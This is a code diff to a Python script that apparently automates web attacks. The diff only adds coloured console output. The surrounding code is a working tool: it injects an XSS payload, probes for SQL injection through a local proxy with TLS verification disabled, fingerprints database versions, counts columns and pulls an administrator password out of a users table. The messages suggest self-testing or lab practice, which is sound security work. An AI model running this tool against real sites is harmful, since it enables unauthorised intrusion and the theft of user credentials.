@@ -6,8 +6,10 @@ import time
 import random, re
 from urllib.parse import urlparse, urljoin
 from requests.exceptions import SSLError, ConnectionError
+from colorama import Fore, Style, init
 
 proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
+init(autoreset=True)
 
 xss_payloads = [
     "<script>alert('XSS')</script>",
@@ -129,7 +131,7 @@ def exploit_xss(url):
         try:
             r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
             if payload in r.text:
-                print(f"[+] XSS vulnerability found in URL with payload: {payload}")
+                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}")
                 return True
         except SSLError as e:
             print(f"[-] SSL Error on {target_url}: {e}")
@@ -222,7 +224,7 @@ def exploit_database_version(url):
                         print(f"[+] Congratulations, your website is secure: access to this URL was blocked with a 403 (Forbidden) code.")
                         continue
                     elif status_code == 500:
-                        print(f"[+] Potential vulnerability found with payload: {payload}")
+                        print(Fore.GREEN + f"[+] Potential vulnerability found with payload: {payload}")
                         continue
                     else:
                         #print(f"[-] An error occurred: Received HTTP {status_code} for this URL.")
@@ -234,32 +236,32 @@ def exploit_database_version(url):
                     if db_type == 'Oracle':
                         version_oracle = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
                         if version_oracle:
-                            print(f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
+                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
                             return
                     elif db_type in ['MySQL', 'Microsoft SQL Server', 'Sybase']:
                         version_generic = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
                         if version_generic:
                             version_number = re.search(r'\d{1,2}\.\d{1,2}\.\d{1,2}[-\w\.]*', version_generic)
                             if version_number:
-                                print(f"[+] Found the database: {db_type} | The version is: {version_number.group(0)}")
+                                print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_number.group(0)}")
                                 return
                     elif db_type == 'PostgreSQL':
                         version_postgres = soup.find(string=re.compile('PostgreSQL\s[\d\.]+'))
                         if version_postgres:
-                            print(f"[+] Found the database: {db_type} | The version is: {version_postgres.strip()}")
+                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_postgres.strip()}")
                             return
                     elif db_type == 'SQLite':
                         version_sqlite = soup.find(string=re.compile('SQLite\s[\d\.]+'))
                         if version_sqlite:
-                            print(f"[+] Found the database: {db_type} | The version is: {version_sqlite.strip()}")
+                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_sqlite.strip()}")
                             return
                     elif db_type == 'DB2':
                         version_db2 = soup.find(string=re.compile('DB2\s[\d\.]+'))
                         if version_db2:
-                            print(f"[+] Found the database: {db_type} | The version is: {version_db2.strip()}")
+                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_db2.strip()}")
                             return
 
-                    print(f"[+] Found the database: {db_type} | [-] Could not extract the version.")
+                    print(Fore.GREEN + f"[+] Found the database: {db_type} | [-] Could not extract the version.")
             
                 else:
                     #print(f"[-] No match found for {db_type} using current payload.")
@@ -327,14 +329,14 @@ def exploit_sqli_users_table(url):
 
                     if password_element and password_element.contents:
                         admin_password = password_element.contents[0]
-                        print(f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
+                        print(Fore.GREEN + f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
                         return True
                     
             admin_element = soup.find(string=re.compile(r'.*administrator.*'))
             if admin_element:
                 try:
                     admin_password = admin_element.split('*')[1]
-                    print(f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
+                    print(Fore.GREEN + f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
                     return True
                 except IndexError:
                     print(f"[-] Failed to correctly extract the administrator password from the payload '{payload_to_try}'")
@@ -393,7 +395,7 @@ def exploit_sqli(url):
             r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
             
             if 500 <= r.status_code < 600:
-                print(f"[+] Vulnerable URL found with payload {payload}")
+                print(Fore.GREEN + f"[+] Vulnerable URL found with payload {payload}")
                 return True
         
         except SSLError as e:
@@ -461,7 +463,7 @@ if __name__ == "__main__":
                 num_col = exploit_sqli_column_number(test_url)
                 if num_col:
                     #print(f"[+] Vulnerable URL found: {test_url}")
-                    print(f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
+                    print(Fore.GREEN + f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
                 else:
                     print("[-] URL not vulnerable to sql injection")
             
